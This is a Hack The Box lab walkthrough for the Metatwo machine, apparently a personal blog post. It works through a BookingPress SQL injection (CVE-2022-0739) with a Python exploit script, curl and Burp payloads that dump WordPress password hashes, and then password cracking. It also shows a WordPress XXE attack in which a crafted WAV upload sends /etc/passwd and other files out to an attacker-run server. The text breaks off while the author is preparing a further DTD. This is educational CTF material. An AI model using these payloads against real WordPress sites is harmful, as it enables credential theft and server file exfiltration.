---
title: Walkthrough - Metatwo, a Hack The Box machine
author: amandaguglieri
date: 2022-10-29T00:00:00Z
draft: false
TableOfContents: true
---

# Walkthrough - Metatwo, a Hack The Box machine

## About the machine

![Metatwo Machine Banner](img/metatwo.png)

| data |  |
|--------| ------- |
| Machine | Metatwo |
| Platform | Hackthebox |
| url | [link](https://app.hackthebox.com/machines/MetaTwo) |
| creator | [Naute](https://app.hackthebox.com/users/27582) |
| OS | Linux |
| Release data | 29 october 2022 |
| Difficulty | Easy |
| Points | 20 |
| ip | 10.10.11.186 |



## Getting user.txt flag

Run:

```bash
export ip=10.10.11.186
```

### Reconnaissance

#### Active Scanning: Service/Port enumeration

Run nmap to enumerate open ports, services, OS, and traceroute. General enumeration not to make too much noise:

```bash
sudo nmap $ip -Pn
```

Results:

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Open 10.10.11.186 in the browser. A redirection to http://metapress.htb occurs, but the server is not found. So we add this routing in our /etc/hosts file:

Open the /etc/hosts file with an editor. For instance, nano.

```bash 
sudo nano /etc/hosts
```

Move the cursor to the end and add these lines:

```
10.10.11.186	metapress.htb
```

Now we can visit the site. The first thing we notice is that it is a WordPress. That means we can use a tool such as wpscan to enumerate resources in the target. As we desire also to know the installed plugins, we will perform an aggressive scan with the flag --plugins-detection. 

First, do the  generic scan:

```bash
wpscan --url http://metapress.htb
```

Results:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://metapress.htb/ [10.10.11.186]
[+] Started: Sun Nov 13 14:58:36 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.18.0
 |  - X-Powered-By: PHP/8.0.24
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://metapress.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://metapress.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://metapress.htb/wpcontent/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:11 <========================================================> (137 / 137) 100.00% Time: 00:00:11

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

```

Two interesting facts that may come into use later are:

+ WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
+ X-Powered-By: PHP/8.0.24

So, we have a WordPress version 5.6.2 that is using a PHP version 8.0.24.

After this, use the aggressive method to scan plugins:

```bash
wpscan --url http://metapress.htb --enumerate vp --plugins-detection aggressive
```

Since this method is really slow, we have some spare time to have a look at the html code with the inspector tool in our browser. This specific line catches our attention:

```
<link rel="stylesheet" id="bookingpress_fonts_css-css" href="http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/fonts/fonts.css?ver=1.0.10" media="all">
```

Sweet. In a very easy way, we've been able to spot an installed plugin and its version: bookingpress version 1.0.10. If we browse the site it's easy to get to http://metapress.htb/events/. Bookingpress plugin version 1.0.10 is vulnerable, so next step will be exploitation.


### Initial access

By searching for "bookingpress 1.0.10" in google, we can learn that there is a critical vulnerability associated with the plugin BookingPress version under 1.0.11. 

Description of CVE-2022-0739: The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection.


We are going to exploit the vulnerability in three different ways:

+ Using a python script.
+ Using the curl command.
+ Using a capture in Burp Suite.

We will leave out of this write-up the tool sqlmap, that authomatizes the attack. Let's get dirty hands with code.

**Python script**
There is a [git repo](https://github.com/destr4ct/CVE-2022-0739) that exploits CVE-2022-0739. 

Let's see the python script:

```python
import requests
from json import loads
from random import randint
from argparse import ArgumentParser

p = ArgumentParser()
p.add_argument('-u', '--url', dest='url', help='URL of wordpress server with vulnerable plugin (http://example.domain)', required=True)
p.add_argument('-n', '--nonce', dest='nonce', help='Nonce that you got as unauthenticated user', required=True)

trigger = ") UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -"
gainer = ') UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users limit 1 offset {off}-- -'

# Payload: ) AND ... -- - total(9)
def gen_payload(nonce, sqli_postfix, category_id=1):
    return { 
        'action': 'bookingpress_front_get_category_services', # vulnerable action,
        '_wpnonce': nonce,
        'category_id': category_id,
        'total_service': f'{randint(100, 10000)}{sqli_postfix}'
    }

if __name__ == '__main__':  
    print('- BookingPress PoC')
    i = 0
    args = p.parse_args()
    url, nonce = args.url, args.nonce
    pool = requests.session()


    # Check if the target is vulnerable
    v_url = f'{url}/wp-admin/admin-ajax.php'
    proof_payload = gen_payload(nonce, trigger)
    
    res = pool.post(v_url, data=proof_payload)
    try:
        res = list(loads(res.text)[0].values())
    except Exception as e:
        print('-- Got junk... Plugin not vulnerable or nonce is incorrect')
        exit(-1)
    cnt = int(res[7])
    
    # Capture hashes
    print('-- Got db fingerprint: ', res[0])
    print('-- Count of users: ', cnt)
    for i in range(cnt):
        try:
            # Generate payload
            user_payload = gen_payload(nonce, gainer.format(off=i))
            u_data = list(loads(pool.post(v_url, user_payload).text)[0].values())
            print(f'|{u_data[0]}|{u_data[1]}|{u_data[2]}|')
        except: continue 
```

Create a python script called bookingpress.py and give it execution permission:

```bash
sudo nano bookingpress.py
# Now we paste the code and save changes with CTRL-X and Yes.
chmod +x bookingpress.py
```

Bookingpress.py requires two arguments. First is "url" and second in "nonce". Wpnonce is generated during the registration of an event in the browser. To obtain it, book a spot in the calendar and capture that with BurpSuite. Here is the traffic intercepted:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Origin: http://metapress.htb
Connection: close
Referer: http://metapress.htb/events/
Cookie: PHPSESSID=akporp33a92q48gn0afe6akrkt

action=bookingpress_front_get_timings&service_id=1&selected_date=2022-11-21&_wpnonce=f26ed88649
```

Now execute the script:

```bash
python bookingpress.py -u metapress.htb -n f26ed88649
```

And results:

```
- BookingPress PoC
-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
-- Count of users:  2
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```

**Curl command**
Also, we could use the following command:

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php'   --data 'action=bookingpress_front_get_category_services&_wpnonce=f26ed88649&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(user_login),group_concat(user_pass),@@version_compile_os,1,2,3,4,5,6 from wp_users-- -'
```

If you use it, remember to change the value of the NONCE parameter. Mine was f26ed88649.


**Capturing the request with Burp**

First, capture a request for an appointment booking with Burp Suite: 


```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1054
Origin: http://metapress.htb
Connection: close
Referer: http://metapress.htb/events/
Cookie: PHPSESSID=1gj5nr7mj3do8f4jr4j5dh0e9d

action=bookingpress_before_book_appointment&appointment_data[selected_category]=1&appointment_data[selected_cat_name]=&appointment_data[selected_service]=1&appointment_data[selected_service_name]=Startupmeeting&appointment_data[selected_service_price]=$0.00&appointment_data[service_price_without_currency]=0'-7502)+UNION+ALL+SELECT+group_concat(user_login),group_concat(user_pass),%40%40version_compile_os,1,2,3,4,5,6+from+wp_users--+-'&appointment_data[selected_date]=2022-11-15&appointment_data[selected_start_time]=10:00&appointment_data[selected_end_time]=10:30&appointment_data[customer_name]=&appointment_data[customer_firstname]=lolo&appointment_data[customer_lastname]=lolo&appointment_data[customer_phone]=7777777777&appointment_data[customer_email]=lolo@lolo.com&appointment_data[appointment_note]=<script>alert(1)</script>&appointment_data[selected_payment_method]=&appointment_data[customer_phone_country]=US&appointment_data[total_services]=&appointment_data[stime]=1668426666&appointment_data[spam_captcha]=In6ygQvJD9EB&_wpnonce=da775e35c6
```

As you can see in the captured traffic, since I restarted my machine due to non related issues, my wpnonce has shifted from f26ed88649 to da775e35c6. Send this request to the Repeater module (CTRL-R) and play with it. After a while testing it, I could craft this request:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: http://metapress.htb
Connection: close
Referer: http://metapress.htb/events/
Cookie: PHPSESSID=1gj5nr7mj3do8f4jr4j5dh0e9d

action=bookingpress_front_get_category_services&_wpnonce=da775e35c6&category_id=33&total_service=9)+OR+1=1;--+-'
```

For that, we have this response:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 14 Nov 2022 08:20:06 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/8.0.24
Access-Control-Allow-Origin: http://metapress.htb
Access-Control-Allow-Credentials: true
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin
Content-Length: 553

[{"bookingpress_service_id":"1","bookingpress_category_id":"1","bookingpress_service_name":"Startup meeting","bookingpress_service_price":"$0.00","bookingpress_service_duration_val":"30","bookingpress_service_duration_unit":"m","bookingpress_service_description":"Join us, we will celebrate our startup!","bookingpress_service_position":"0","bookingpress_servicedate_created":"2022-06-23 18:02:38","service_price_without_currency":0,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

Cool. Let's now check what happens when you use this payload:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 14 Nov 2022 08:22:46 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/8.0.24
Access-Control-Allow-Origin: http://metapress.htb
Access-Control-Allow-Credentials: true
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin
Content-Length: 2

[]
```

So, when the condition is false (1=2), we are having a different response from the server. This proves that we are facing a SQL Injection vulnerability.

Also, we could run a scanner with the tool **sqlmap** to see if this request is vulnerable. Save this request in a file (in my case I will call it bookrequest:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: http://metapress.htb
Connection: close
Referer: http://metapress.htb/events/
Cookie: PHPSESSID=1gj5nr7mj3do8f4jr4j5dh0e9d

action=bookingpress_front_get_category_services&_wpnonce=da775e35c6&category_id=33&total_service=9
```

Now run sqlmap:

```bash
sqlmap -r bookrequest
```

Extract from the results:

```
[03:30:05] [INFO] POST parameter 'total_service' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'total_service' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 436 HTTP(s) requests:
---
Parameter: total_service (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=da775e35c6&category_id=33&total_service=9) AND (SELECT 2533 FROM (SELECT(SLEEP(5)))kDHj) AND (2027=2027

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=da775e35c6&category_id=33&total_service=9) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a717071,0x467874624e5a4862654847417a50625064757853724c584c57504443685668756446725643566d56,0x7171627a71),NULL,NULL-- -
---
[03:30:17] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0, PHP 8.0.24
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[03:30:17] [WARNING] HTTP error codes detected during run:
400 (Bad Request) - 123 times
[03:30:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'
```

This saves us some time. Now we know there are two SQLi vulnerabilities. The first is a time-based blind one. And the second one is a SQL injection based on a UNION QUERY. Also, we know the query is on a table with 9 columns, being the seventh one the injectable. 

We could have also used the Repeater module in Burp Suite and sent a request for 9 columns and for 10 columns (I will only paste the payload):

```
# payload of 9 columns. In case of an empty response, the table would have 8 columns.

action=bookingpress_front_get_category_services&_wpnonce=da775e35c6&category_id=33&total_service=9)+OR+1=1+order+by+9;--+-

# payload of 10 columns. In case of an empty response, the table would have 9 columns.

action=bookingpress_front_get_category_services&_wpnonce=da775e35c6&category_id=33&total_service=9)+OR+1=1+order+by+10;--+-
```

Since we have an empty response with 10 columns we can conclude that the table has 9 columns. 

To get which columns are being displayed, use this payload:

```
action=bookingpress_front_get_category_services&_wpnonce=da775e35c6&category_id=33&total_service=9)+UNION+SELECT+all+1,2,3,4,5,6,7,8,9;--+-
```

In the body of the response, we obtain:

```

[{"bookingpress_service_id":"1","bookingpress_category_id":"2","bookingpress_service_name":"3","bookingpress_service_price":"$4.00","bookingpress_service_duration_val":"5","bookingpress_service_duration_unit":"6","bookingpress_service_description":"7","bookingpress_service_position":"8","bookingpress_servicedate_created":"9","service_price_without_currency":4,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

All of the columns are being displayed, and this makes sense since it is a UNION query.


Now we are ready to perfom our attack using Burpsuite. These would be the succesive payloads:

```
# 1. Get the names of the databases:

action=bookingpress_front_get_category_services&_wpnonce=da775e35c6&category_id=33&total_service=9)+UNION+SELECT+table_schema,null,null,null,null,null,null,null,null+FROM+information_schema.tables;--+-

# Body of the response:

[{"bookingpress_service_id":"information_schema","bookingpress_category_id":null,"bookingpress_service_name":null,"bookingpress_service_price":"$0.00","bookingpress_service_duration_val":null,"bookingpress_service_duration_unit":null,"bookingpress_service_description":null,"bookingpress_service_position":null,"bookingpress_servicedate_created":null,"service_price_without_currency":0,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"},{"bookingpress_service_id":"blog","bookingpress_category_id":null,"bookingpress_service_name":null,"bookingpress_service_price":"$0.00","bookingpress_service_duration_val":null,"bookingpress_service_duration_unit":null,"bookingpress_service_description":null,"bookingpress_service_position":null,"bookingpress_servicedate_created":null,"service_price_without_currency":0,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]

# 2. Get the names of all tables from the selected database:

action=bookingpress_front_get_category_services&_wpnonce=da775e35c6&category_id=33&total_service=9)+UNION+SELECT+table_name,null,null,null,null,null,null,null,null+FROM+information_schema.tables+WHERE+table_schema=blog;--+-

# But since we are having some issues when using "WHERE" we will dump the database. 

action=bookingpress_front_get_category_services&_wpnonce=da775e35c6&category_id=33&total_service=9)+UNION+SELECT+null,null,null,null,null,null,null,null,table_name+FROM+information_Schema.tables;--+-

# This will give us an extended response from where we need to read and select the interesting table. We will use filters in BurpSuite to locate all results related to USERS. And, as matter of fact we can locate a specific table (the common one in WordPress, by the way): wp_users. We will use this later.

# 3. Get the name of all columns of a selected table from a selected database. But since we are having problems using WHERE, we will dump all columns names:

action=bookingpress_front_get_category_services&_wpnonce=da775e35c6&category_id=33&total_service=9)+UNION+SELECT+column_name,null,null,null,null,null,null,null,null+FROM+information_schema.columns;--+-

# Again, the response is vast. We can use Burpsuite filter to find these two colums: user_pass and user_login

# 4. Now we can query the two columns we want (user_login and user_pass) from the table wp_users:

action=bookingpress_front_get_category_services&_wpnonce=da775e35c6&category_id=33&total_service=9)+UNION+SELECT+user_login,user_pass,null,null,null,null,null,null,null+FROM+wp_users;--+-

# And the body response:

[{"bookingpress_service_id":"admin","bookingpress_category_id":"$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.","bookingpress_service_name":null,"bookingpress_service_price":"$0.00","bookingpress_service_duration_val":null,"bookingpress_service_duration_unit":null,"bookingpress_service_description":null,"bookingpress_service_position":null,"bookingpress_servicedate_created":null,"service_price_without_currency":0,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"},{"bookingpress_service_id":"manager","bookingpress_category_id":"$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70","bookingpress_service_name":null,"bookingpress_service_price":"$0.00","bookingpress_service_duration_val":null,"bookingpress_service_duration_unit":null,"bookingpress_service_description":null,"bookingpress_service_position":null,"bookingpress_servicedate_created":null,"service_price_without_currency":0,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

Same results:

| user_login | user_pass |
|------------| ----------|
| admin | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. |
| manager | $P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70 |




We are going to use the tool [JohnTheRipper](https://github.com/drwetter/JohnTheRipper) and the dictionary rockyou.txt to crack the hash.

Let's first create the file book.hash with the hashes we just found.

```
nano book.hash
```

We copy paste the hashes in different lines:

 ```
$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70
```

Press CTRL-X and enter Yes.

Now run johntheripper:


```bash
john -w=/usr/share/wordlists/rockyou.txt book.hash 
```

Results:

```

```

Log in into http://metapress.htb/wp-admin with the credentials of manager. After doing so, we realize that manager is a limited user. It does not have admin rights, ok, but the user manager can upload media.

After a little bit of research (reading documentation from [wpscan.com](https://wpscan.com/wordpress/562) we can see that it exists a specific vulnerability for:

+ a logged user who has enabled media uploading.
+ wordpress version 5.6.2
+ PHP version 8

Since, our user falls into those parameters let's going to read a little bit more about that vulnerability. [Read here](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5). Quoting:

**Description**: A user with the ability to upload files (like an Author) can exploit an XML parsing issue in the Media Library leading to XXE attacks. WordPress used an audio parsing library called ID3 that was affected by an XML External Entity (XXE) vulnerability affecting PHP versions 8 and above. This particular vulnerability could be triggered when parsing WAVE audio files. Researchers at security firm SonarSource discovered this XML external entity injection (XXE) security flaw in the WordPress Media Library.

Impact: 

+ *Arbitrary File Disclosure*: The contents of any file on the host’s file system could be retrieved, e.g. wp-config.php which contains sensitive data such as database credentials.
* *Server-Side Request Forgery (SSRF)*: HTTP requests could be made on behalf of the WordPress installation. Depending on the environment, this can have a serious impact.

This is my first XXE attack! And it's also a pending subject for me because I was asked about it in a job interview for a pentester position and I didn't know how to answer. Great! No pain. Let's get our hands dirty =)

[Wpscan](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5) provides us with a Proof Of Concept (POC):

1. Create payload.wav:

```
RIFFXXXXWAVEBBBBiXML<!DOCTYPE r [

<!ELEMENT r ANY >

<!ENTITY % sp SYSTEM "http://attacker-url.domain/xxe.dtd">

%sp;

%param1;

]>

<r>&exfil;</r>>
```

2. Create xxe.dtd, the file we're going to serve:

```
<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php">

<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker-url.domain/?%data;'>">
```

My IP is 10.10.14.33 and I will be using port 1234 and "xxe.dtd" as the name of the file in my server, so payload.wav would be (using flag -en to encode characters):

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.33:1234/xxe.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

And my xxe.dtd file if I want to get the /etc/password file:

```
<<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.33:1234/?p=%file;'>" >
```

Now, in the same folder where we have saved xxe.dtd, run a php server. In my case:

```bash
php -S 10.10.14.33:1234
```

Now we are ready to upload payload.wav in http://metapress.htb/wp-admin/upload.php. After we do, in the command line from we were serving our xxe.dtd file, we can read:

```
10.10.11.186:39962 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory   
```

We will use PHP to decode this. Create a .php with the following code, just be sure to copy and paste the base64 returned from the WordPress server where we have 'base64here' in the example code:

```php
<?php echo zlib_decode(base64_decode('base64here')); ?>
```

In my case, I will call the file code.php, and it will have the following php content:


```php
<?php echo zlib_decode(base64_decode('jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw=='); ?>
```

Give executable permission to th file code.php and execute it:

```bash
chmod +x code.php
php code.php
```

Results:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

Users with access to the bash terminal would be: root and jnelson. Noted!

To request different content to the WordPress server, we only need to modify our xxe.dtd file and instead of "/etc/passwd", use a different path. Common files to check out are:

+ username/.ssh/id_rsa.pub: with this, we could try to login into the ssh server.
+ /etc/shadow: to extract hashes.
+ In a WordPress server: wp-config.php: inhere you could find some credentials.
+ Logs and more...

Let's start with wp-config.php. We know from previous scans that the WordPress installation is running on a nginx server. Also, we know that wp-cofig.php file is always located at the root of the WordPress installation. Reading at the documentation, we can see that nginx server has a file that displays the enabled sites and provides an absolute path to them. That file is "/etc/nginx/sites-enabled/default". So, with that in mind, we can craft our xxe-nginx.dtd file with this content:

```
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/nginx/sites-enabled/default">
